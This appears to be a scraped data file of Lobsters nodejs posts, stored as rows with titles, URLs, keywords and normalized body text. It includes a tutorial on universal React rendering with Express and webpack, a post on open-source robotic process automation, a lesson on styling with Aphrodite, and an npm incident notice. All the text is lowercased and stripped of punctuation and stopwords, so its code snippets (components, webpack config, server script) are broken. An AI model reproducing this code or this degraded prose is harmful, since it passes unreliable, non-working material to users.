data couple view well something peculiar happens behind scene hardly noticed regular user make developement super interesting app using universal rendering routing prove using developer tool browser initially load page browser page necessarily home page try example one server provides full html code view browser need download linked resource image stylesheets script switch another view everything happens browser html code loaded server new resource new image following example loaded browser another quick test still convinced command line using curl curl s http judoheroesherokuappcomathleteteddyriner see full html page including code rendered react generated directly server bet convinced enough eager get hand dirty let start coding end tutorial project structure look like following tree packagejson webpackconfigjs src appclientjs routesjs serverjs component approutesjs athletepagejs athletepreviewjs athletesmenujs flagjs indexpagejs layoutjs medaljs notfoundpagejs data athletesjs static indexhtml cs faviconico img j view indexejs main level packagejson describe project define dependency webpackconfigjs webpack configuration file rest code stored inside folder src contains main file needed routing routesjs rendering appclientjs serverjs also contains subfolders component contains react component data contains data module static contains static file needed application cs j image etc indexhtml use initially test app view contains template use server render html content server requisite nodejs version preferred npm installed machine let create new folder called judoheroes somewhere disk point terminal launch npm init bootstrap nodejs project allowing u add needed dependency need babel ejs express react reactrouter installed run following command npm install save babelcli babelcore babelpresetreact ejs express react reactdom reactrouter also need install webpack babel loader extension httpserver development dependency npm install savedev webpack babelloader httpserver assuming basic knowledge react jsx component based approach read excellent article react component look react related article scotchio initially focus creating functional single page application client side rendering later see improve adding universal rendering routing first thing need html boilerplate host app store srcstaticindexhtml doctype html html head meta charset meta name viewport content widthdevicewidth title judo hero universal javascript demo application react title link rel stylesheet href cssstylecss head body div id main div script src jsbundlejs script body html nothing special two main thing underline using simple handmade stylesheet might want download save srcstaticcss also reference jsbundlejs file contains javascript frontend code see later article generate using webpack babel nt need worry real world application would probably use api obtain data necessary application case small dataset athlete related information keep thing simple embed data javascript module way easily import data component module synchronously avoiding added complexity pitfall managing asynchronous apis universal javascript project goal article let see module look like const athlete id driulisgonzalez name driulis gonzález country cu birth image driulisgonzalezjpg cover driulisgonzalezcoverjpg link http enwikipediaorgwikidriulisgonzález medal year type b city barcelona event olympic game category year type b city hamilton event world championship category year type g city chiba event world championship category year type g city mar del plata event pan american game category year type g city atlanta event olympic game category year type city osaka event world championship category year type g city birmingham event world championship category year type city sydney event olympic game category year type g city domingo event pan american game category year type city osaka event world championship category year type b city athens event olympic game category year type b city cairo event world championship category year type g city cartagena event central american caribbean game category year type g city cartagena event central american caribbean game category tema year type g city rio de janeiro event pan american game category year type g city rio de janeiro event world championship category export default athlete brevity file truncated displaying data one five athlete want see full code check official repository download file srcdataathletesjs also notice reporting use strict though present every javascript file going create course tutorial see file contains array object every object represents athlete containing generic information like id name country another array object representing medal athlete might also want grab image file repository copy srcstaticimg going organize view application several component set small ui component used build view athletepreview flag medal athletesmenu layout component used master component define generic appearence application header content footer block two main component represent main section indexpage athletepage extra page component use page notfoundpage approutes component us react router manage routing view flag component first component going build allows u display nice flag optionally name country represents import react react const data cu name cuba icon flagcupng fr name france icon flagfrpng jp name japan icon flagjppng nl name netherlands icon flagnlpng uz name uzbekistan icon flaguzpng export default class flag extends reactcomponent render const name data thispropscode name const icon data thispropscode icon return span classname flag img classname icon title name src img icon thispropsshowname span classname name name span span might noticed component us small array country data source make sense need small data set sake demo app going change real application larger complex data set might want use api different mechanism connect data component component also important notice using two different prop code showname first one mandatory must passed component select flag shown among one supported showname prop instead optional set truthy value component also display name country flag want build refined reusable component real world app might also want add prop validation default going skip step goal app want build medal component medal component similar flag component receives prop represent data related medal type g gold silver b bronze year name event city tournament hosted category athlete medal competed import react react const typemap g gold silver b bronze export default class medal extends reactcomponent render return li classname medal span classname symbol symbol thispropstype title typemap thispropstype thispropstype span span classname year thispropsyear span span classname city thispropscity span span classname event thispropsevent span span classname category thispropscategory span li previous component also use small object map code medal type descriptive name section going build menu displayed top every athlete page allow user easily switch another athlete without going back index import react react import link reactrouter export default class athletesmenu extends reactcomponent render return nav classname athletesmenu thispropsathletesmap menuathlete return link key menuathleteid athlete menuathleteid activeclassname active menuathletename link nav component simple key point underline expecting data passed component athlete prop outside use component layout need propagate list athlete available app directly component use map method iterate athlete generate every one link link special component provided react router create link view finally use prop activeclassname use class active current route match path link athlete preview component athletepreview component used index display picture name athlete let see code import react react import link reactrouter export default class athletepreview extends reactcomponent render return link athlete thispropsid div classname athletepreview img src img thispropsimage classname name thispropsname span classname medalscount img src imgmedalpng thispropsmedalslength span div link code quite simple expect receive number prop describe attribute athlete want display like id image name medal note using link component create link athlete page layout component built basic component let move creating give visual structure application first one layout component purpose providing display template whole application defining header space main content footer import react react import link reactrouter export default class layout extends reactcomponent render return div classname appcontainer header link img classname logo src imglogojudoheroespng link header div classname appcontent thispropschildren div footer p demo app showcase universal rendering routing strong react strong strong express strong p footer div component pretty simple understand work looking code though interesting prop using child prop special property react provides every component allows nest component one inside another going see routing section react router make sure nest component layout component index page component component constitutes full index page contains component previously defined import react react import athletepreview athletepreview import athlete dataathletes export default class indexpage extends reactcomponent render return div classname home div classname athletesselector athletesmap athletedata athletepreview key athletedataid athletedata div div note component using athletepreview component created previously basically iterating available athlete data module creating athletepreview component athletepreview component data agnostic need pas information current athlete prop using jsx spread operator object athlete page component similar fashion define athletepage component import react react import link reactrouter import notfoundpage notfoundpage import athletesmenu athletesmenu import medal medal import flag flag import athlete dataathletes export default class athletepage extends reactcomponent render const id thispropsparamsid const athlete athletesfilter athlete athleteid id athlete return notfoundpage const headerstyle backgroundimage url img athletecover return div classname athletefull athletesmenu athlete athlete div classname athlete header style headerstyle div classname picturecontainer img src img athleteimage classname name athletename div section classname description olympic medalist strong flag code athletecountry showname true strong born athletebirth find href athletelink target blank wikipedia section section classname medal p winner strong athletemedalslength strong medal p ul athletemedalsmap medal medal key medal ul section div div classname navigateback link back index link div div must able understand code shown component used build view might important underline page component accepts outside id athlete include data module able retrieve related information beginning render method using function filter data set also considering case received id exist data module case render notfoundpage component going create next section one last important detail accessing id thispropsparamsid instead simply thispropsid params special object created react router using component route allows propagate routing parameter component easier understand concept see setup routing part application found page component let see notfoundpage component act template generate code page import react react import link reactrouter export default class notfoundpage extends reactcomponent render return div classname notfound page found p link go back main page link p div app route component last component need create approutes component master component render view using internally react router component use route module let quick look first import react react import route indexroute reactrouter import layout componentslayout import indexpage componentsindexpage import athletepage componentsathletepage import notfoundpage componentsnotfoundpage const route route path component layout indexroute component indexpage route path athlete id component athletepage route path component notfoundpage route export default route file basically using react router route component map set route page component defined note route nested inside main route component let explain work root route map path layout component allows u use custom layout every section application component defined nested route rendered inside layout component place thispropschildren property discussed first child route indexroute special route used define component rendered viewing index page parent route case use indexpage component index route path athlete id mapped athletepage note using named parameter id route match path prefix athlete remaining part associated params id available inside component thispropsparamsid finally matchall route map every path notfoundpage component route must defined last one let see use route react router inside approutes component import react react import router browserhistory reactrouter import route route export default class approutes extends reactcomponent render return router history browserhistory route route onupdate windowscrollto basically need import router component add inside render function router receives route mapping router prop also configure history prop specify want use browser history routing alternative could also use hashhistory finally also added onupdate callback reset scrolling window top everytime link clicked last bit code complete first version application define javascript logic initializes whole app browser import react react import reactdom reactdom import approutes componentsapproutes windowonload reactdomrender approutes documentgetelementbyid main thing import master approutes component render using reactdomrender method react app living inside main dom element able run application need generate bundlejs file containing react component webpack file executed browser webpack make sure convert module code executed common browser environment webpack convert react jsx syntax equivalent syntax using babel executed practically every browser furthermore use webpack apply number optimization resulting code like combining script file one file minifying resulting bundle let write webpack configuration file const webpack require webpack const path require path moduleexports entry pathjoin dirname src appclientjs output path pathjoin dirname src static j filename bundlejs module loader test pathjoin dirname src loader babelloader query cachedirectory babelcache presets react plugins new webpackdefineplugin processenvnodeenv jsonstringify processenvnodeenv new webpackoptimizededupeplugin new webpackoptimizeoccurenceorderplugin new webpackoptimizeuglifyjsplugin compress warning false mangle true sourcemap false beautify false deadcode true first part configuration file define entry point output file entry point main javascript file initializes application webpack recursively resolve includedimported resource determine file go final bundle moduleloaders section allows specify transformation specific file want use babel react presets convert included javascript file code final section use plugins declare configure optimization plugins want use defineplugin allows u define nodeenv variable global variable bundling process defined one script module eg react relies enable disable specific feature current environment production development dedupeplugin remove duplicated file module imported one module occurenceorderplugin help reducing file size resulting bundle uglifyjsplugin minifies obfuscates resulting bundle using uglifyjs ready generate bundle file need run nodeenvproduction nodemodulesbinwebpack p window use powershell run set nodeenvproduction nodemodulesbinwebpack p thanks mile rausch suggestion nodeenv environment variable p option used generate bundle production mode apply number additional optimization example removing debug code react library everything went fine bundle file srcstaticjsbundlejs finally ready play first version app nt nodejs web server yet use module httpserver previously installed development dependency run simple static file web server nodemodulesbinhttpserver srcstatic app magically available http ok take time play click link explore section everything seem work allright well almost little caveat refresh page section different index get error server number way address problem case solved soon implement universal routing rendering solution let move next section ok ready evolve application next level build missing server side part order server side routing rendering use express relatively small server script see moment rendering part use ejs template replacement indexhtml file save srcviewsindexejs doctype html html head meta charset meta name viewport content widthdevicewidth title judo hero universal javascript demo application react title link rel stylesheet href cssstylecss head body div id main markup div script src jsbundlejs script body html difference original html file using template variable markup inside main div order include react markup servergenerated html code ready write server application import path path import server http import express express import react react import rendertostring reactdomserver import match routercontext reactrouter import route route import notfoundpage componentsnotfoundpage const app new express const server new server app appset view engine ejs appset view pathjoin dirname view appuse expressstatic pathjoin dirname static appget req re match route location requrl err redirectlocation renderprops err return resstatus send errmessage redirectlocation return resredirect redirectlocationpathname redirectlocationsearch let markup renderprops markup rendertostring routercontext renderprops else markup rendertostring notfoundpage resstatus return resrender index markup const port processenvport const env processenvnodeenv production serverlisten port err err return consoleerror err consoleinfo server running http localhost port env code commented nt hard get general understanding going important part code express route defined appget req re express catchall route intercept get request every url server inside route take care delegating routing logic react router match function reactroutermatch accepts two parameter first one configuration object second callback function configuration object must two key route used pas react router route configuration passing exact configuration used clientside rendering location used specify currently requested url callback function called end matching receive three argument error redirectlocation renderprops use determine exactly result match operation four different case need handle first case error routing resolution handle case simply return internal server error response browser second case match route redirect route case need create server redirect message redirect tell browser go new destination really happening application using redirect route react router configuration good ready case decide keep evolving application third case match route render associated component case argument renderprops object contains data need use render component component rendering routercontext contained react router module responsible rendering full component tree using value renderprops last case route matched simply return found error browser core server side routing mechanism use reactdomrendertostring function able render html code represents component associated currently matched route finally inject resulting html indexejs template defined obtain full html page send browser ready run serverjs script using jsx syntax simply run node interpreter need use babelnode full command root folder project look like nodeenvproduction nodemodulesbinbabelnode presets react srcserverjs stage app available http sake tutorial considered complete feel free check try section link notice time refresh every page server able identify current route render right page small advice nt forget check page entering random nonexisting url hooray completes tutorial really happy know got end make even happier post comment example universal javascript apps built using similar approach want know universal javascript improve application even eg adding universal data retrival using rest apis definitely recommend read chapter universal javascript web application book nodejs design pattern next time p huge thanks mario casciaro reviewing article marwen trabelsi support improving code also thanks criticalmas finding typo p like article follow loige twitter
328,Lobsters,nodejs,Node.js programming,I Don't Need No Stinking API - Web Scraping in 2016 and Beyond,https://franciskim.co/2016/08/24/dont-need-no-stinking-api-web-scraping-2016-beyond/,nt need stinking api web scraping beyond,original post archiveorg fairly well preserved copy rpa presentation pro con,year wrote blog post called nt need stinkin api web scraping beyond absolute surprise went hacker news nearly full hour site crashed luckily aws could upsize server quickly someone kind enough quickly create cache somewhere tooif original post archiveorg fairly well preserved copy hereby way nt familiar term rpa mean software automationit taken post even though still getting hit go maybe least seo let get back track wrote still relevant today especially mindset behind word nt give api create bot job bot jobi recently heard robocorp secured usd seed round funding bring open source rpa market also turn back existing open source platform called robot framework fact investor putting money behind something nt always validate market good amount domain knowledge able see capital moving around chance gut feel correct open source rpa going game changer rpa industry well techenabled company year ten year comeantti karjalainen ceo robocorp half way presentation robocon raise excellent pointspeople designed move information one system anotheri completely agree could nt said better fact go link act job satisfaction level obviously employee time time given task involve lot manual repetitive process could automate easily naturally efficiency around company go well job satisfaction level one reason bullish rpabut open source given emerging industry open source flavour needed magento became open source option ecommerce automattic changed game blogging open source software wordpress later acquired closed source popular platform tumblr take spot open source rpa ecosystem working ultramodern rpa platform web called intend making open source chat angel investor behind decision whatever may thankful asked make part open source cool ultimately come decisionhere think nutshell proseasier get traction dev communityeasier market certain company sensitive data etc higher probability going viralfeeling contribution societyconsneed rethink monetisation modelneed refactor lot codesomeone backed big money might take spin creating competitormight impact future funding opportunity could positive think pro outweigh con definitelyanother reason extremely bullish software robot recessionproof economy break better time deploy digital workforce supplement downsized human resourcing well ideally happen economy break really ready get point told usually every year world economic crisis epic proportion happen gfc happened top head bursting dotcom bubble lucky living australia usually shielded lot macroeconomic geopolitical event happen nt really seen least nt really feel impact event maybe young ca nt help little bearish world economic outlook time want something happen betting rpa seem like smart move counteract eventsthere million reason excited power rpa seen tip iceberg seen heard feel like addressable market still untapped open source definitely help bring rpa mass easy implement help raise awarenessawareness one thing lacking rpa stage feel like mean came across term towards end last year web automation like forever movement embodies community undoubtedly naturally bring awareness let end post saying bullish open source flavour robotic process automation
329,Lobsters,nodejs,Node.js programming,Styling React Components With Aphrodite,https://egghead.io/lessons/react-styling-react-components-with-aphrodite,styling react component aphrodite,,simple react button component click pretty ugly let add inline style creating style object pas style button prettier still work also defining inline style come along free anyone us component let add aphrodite importing stylesheet cs aphrodite package take style object wrap call stylesheetcreate also add one level nesting style object call everything button instead assigning thing style use classname call cs function stylesbutton save everything look exact inspect element though notice class instead inline style also look head see dataaphrodite style tag contains style look suspiciously like defined call cs pas stylesheet object aphrodite parsing code turning cs injecting dom also us object key generate unique class name share pass classname attribute let use cs already know add active hover state button first define active pseudo class add boxshadow someone clicking button beautiful next add hover pseudo class someone hovers button turn color button little easier interact get benefit cs like pseudo class along benefit inline style like encapsulation avoiding selector war specificity problem
331,Lobsters,nodejs,Node.js programming,"npm - ""fs"" unpublished and restored",https://npmjs.statuspage.io/incidents/dw8cr1lwxkcr,npm f unpublished restored,f unpublished restored creates resolve,subscribe update f unpublished restored via email andor text message receive email notification incident updated text message notification whenever npm creates resolve incident get update via text message
